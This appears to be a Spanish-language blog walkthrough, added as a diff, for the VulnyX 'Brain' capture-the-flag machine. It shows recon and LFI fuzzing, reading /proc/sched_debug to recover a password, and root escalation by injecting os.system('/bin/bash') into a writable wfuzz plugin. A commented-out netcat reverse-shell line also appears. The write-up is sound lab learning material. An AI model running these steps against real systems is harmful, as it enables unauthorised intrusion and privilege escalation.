@@ -1,0 +1,134 @@
+---
+layout: post
+title: "Brain"
+date: 2024-04-19 12:57:23
+category: sample
+vm: vulnyx
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/vulnyx/vulnyx.png" width=252></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Brain </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
+  <tr> <td><strong>Link OVA:</strong><a href="https://vulnyx.com/#brain"> Vulnyx</a></td> </tr>
+</table>
+
+<br>
+
+![serve](/notas/public/img/vulnyx/brain/host.png){:.margin}{:.margin}
+
+**1\.** Verificamos dispositivos en la red.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![host](/notas/public/img/vulnyx/brain/arp_scan.png){:.margin}
+
+**2\.** Escaneamos puertos del host víctima.
+
+`sudo nmap -p- -sS -T5 -sCV --open --min-rate=5000 -n -Pn 192.168.1.7 -oN report_scan`
+
+![host](/notas/public/img/vulnyx/brain/nmap.png){:.margin}
+
+**3\.** Visitamos el servicio Apache por el puerto 80.
+
+`http://192.168.1.7/`
+
+![host](/notas/public/img/vulnyx/brain/80.png){:.margin}
+
+**4\.** Hacemos fuzzing de directorios y archivos.
+
+`gobuster dir -u http://192.168.1.7/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt`
+
+![host](/notas/public/img/vulnyx/brain/gobuster.png){:.margin}
+
+- Si visitamos index.php vemos lo mismo:
+
+![host](/notas/public/img/vulnyx/brain/index.png){:.margin}
+
+**5\.** Hacemos fuzzing de parámetros en busca de un LFI..
+
+`wfuzz -c -t 50 --hl=7 --hc=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt 'http://192.168.1.7/index.php?FUZZ=/etc/passwd'`
+
+![host](/notas/public/img/vulnyx/brain/wffuz.png){:.margin}
+
+**6\.** Ingresamos la ruta completa con el parámetro hallado.
+
+`http://192.168.1.7/index.php?include=/etc/passwd`
+
+![host](/notas/public/img/vulnyx/brain/include.png){:.margin}
+
+_tenemos inclusion de archivos locales (LFI)_
+
+- Si presionamos `ctrl + u` podemos visualizar mejor, y encontramos el usuario ben:
+
+![host](/notas/public/img/vulnyx/brain/ben.png){:.margin}
+
+**7\.** incluimos el la ruta sched_debug, donde podemos ver la contraseña de ben.
+
+`view-source:http://192.168.1.7/index.php?include=/proc/sched_debug`
+
+![host](/notas/public/img/vulnyx/brain/sched_debug.png){:.margin}
+
+_\- Si un servidor web tiene una vulnerabilidad LFI y permite acceder a esta ruta, un atacante podría obtener información confidencial, como contraseñas almacenadas en memoria._
+
+**8\.** Accedemos por ssh al host como el usuario ben.
+
+`ssh ben@192.168.1.7`
+
+![host](/notas/public/img/vulnyx/brain/ssh_ben.png){:.margin}
+
+**9\.** Listamos permisos sudo, podemos ejecutar el binario wfuzz como root.
+
+`sudo -l`
+
+![host](/notas/public/img/vulnyx/brain/sudo_l.png){:.margin}
+
+_\- buscando en la web [gtfobins](https://gtfobins.github.io/#wfuzz) no encontramos referencia alguna._
+
+**10\.** Buscamos archivos con permisos de escritura relacionados al binario wfuzz.
+
+`find / -type f -writable 2> /dev/null | grep wfuzz`
+
+![](/notas/public/img/vulnyx/brain/find.png){:.margin}
+
+**11\.** Agregamos estas 2 lineas para obtener una bash.
+
+`nano /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py`
+
+`import os`
+
+`os.system("/bin/bash")`
+
+![](/notas/public/img/vulnyx/brain/nano.png){:.margin}
+
+<!-- os.system("nc -e (/bin/sh 192.168.1.12 443") ///alternativa enivarnos una shell -->
+
+**12\.** Ejecutamos el binario como root, ya somos superusuario.
+
+`sudo /usr/bin/wfuzz -c -z range 1-2`
+
+![](/notas/public/img/vulnyx/brain/root.png){:.margin}
+
+**13\.** Finalizamos leendo la flag de root.
+
+`cd`
+
+`ls`
+
+`cat root.txt`
+
+![](/notas/public/img/vulnyx/brain/flag.png){:.margin}
+
+<br>
+
+##### **_finalizado._**
